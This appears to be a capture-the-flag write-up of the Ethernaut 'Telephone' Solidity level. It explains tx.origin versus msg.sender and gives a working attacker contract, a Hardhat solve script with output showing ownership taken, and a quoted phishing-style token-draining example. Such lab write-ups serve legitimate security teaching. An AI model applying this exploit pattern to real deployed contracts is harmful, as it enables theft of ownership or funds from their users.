---
title: Ethernaut Telephone
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Telephone challenge writeup
---

## Telephone

### Challenge

Claim ownership of the contract below to complete this level.

  Things that might help

* See the Help page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Background

This challenge only requires differenciating between `tx.origin` and `msg.sender`. The difference between the two is that the one (`tx.origin`) is who initiated the transaction while the other (`msg.sender`) is who triggered the call. In a simple transaction where all interactions are within the same contract, both `tx.origin` and `msg.sender` are the same address, that of the `EOA` that triggered the transaction. When a contract is interacting with another contract, then for the caller contract, both `tx.origin` and `msg.sender` are the same, while for the callee contract, the `tx.origin` is the `EOA` that initiated the transaction while the `msg.sender` is the caller contract.

### Attack

The attack is very simple, in order change owner we need to trigger the contract with different `msg.sender` and `tx.origin` values.

* Deploy an attacker controlled contract that can call `changeOwner`.
* Trigger the attacker controlled contract to call `changeOwner`

#### TelephoneSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../challenges/Telephone.sol';

contract TelephoneSolve {

  constructor() public {}

  function changeOwner(address _telephoneAddress, address _newOwner) public returns (bool) {
    Telephone telephoneContract = Telephone(_telephoneAddress);
    telephoneContract.changeOwner(_newOwner);
  }
}
```

#### telephone-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    telephoneAddress = "0xd7169D9972e3a4083a2d716f3E4a26F2D9A5605c";
    contract = await ethers.getContractAt("Telephone", telephoneAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    TelephoneSolve = await ethers.getContractFactory("TelephoneSolve");
    telephoneSolve = await TelephoneSolve.deploy();
    await telephoneSolve.deployed();

    console.log("Level address   : " + contract.address)
    console.log("Contract Owner  : " + await contract.owner())

    // trigger change owner
    tx = await telephoneSolve.connect(account).changeOwner(
        contract.address, 
        account.address, 
    )
    receipt = await tx.wait()

    console.log("Contract Owner  : " + await contract.owner())    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/telephone-solve.js --network rinkeby
Level address   : 0xd7169D9972e3a4083a2d716f3E4a26F2D9A5605c
Contract Owner  : 0x0b6F6CE4BCfB70525A31454292017F640C10c768
Contract Owner  : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
```

### Success Message

While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.
```
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```
2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
```
function () payable {
  token.transfer(attackerAddress, 10000);
}
```
3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

